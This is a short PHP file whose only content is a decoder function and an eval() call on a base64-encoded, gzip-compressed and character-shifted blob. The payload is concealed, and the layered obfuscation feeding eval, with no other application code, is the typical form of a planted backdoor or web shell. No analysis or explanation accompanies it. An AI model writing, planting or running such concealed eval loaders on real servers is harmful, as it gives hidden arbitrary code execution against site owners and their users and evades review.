<?php function Kvg($yVMA)
{ 
$yVMA=gzinflate(base64_decode($yVMA));
 for($i=0;$i<strlen($yVMA);$i++)
 {
$yVMA[$i] = chr(ord($yVMA[$i])-1);
 }
 return $yVMA;
 }eval(Kvg("pVLBaoNAEP0Av2KQgApNe7c0hSSHHnL0Vsqy6liXbHbD7ggNJd/edY2aJttTBw+D83zvzTwBXEVRJbm1UKwLttGHg1ZsLXW1Z2shZam5qdkWG95JAvwiVPUAnac36Og76mmPRhNWhDU0napIaAWsxEYbLPQbHWSaedgA7mtBgiTCi2taYZerltstJ54m/n2Swes4+UT6PckhHi1ONuLnmbkW9ij5aaMVCdXhTqh9QCeACqqGcTk0XFq8Uh0+s0hFbzMd9sumeV9+vL3nSz1XNpNNzZEbVJTnN7cMIBdln8u8p/O/4yfdUZotV5VBTuiTc2csqRzP9jR1zKKPLQlZ9oeonGNnJnmAuHAS4B4O1Gqju89WnqC+ZDJRPsbZ3X1GGfv+0Xv1pgPbiAbSUI7Z1R/0N+v/LsCqi6D0Uc/uzvc+DVJn1KA4AM/ROfoB"));?>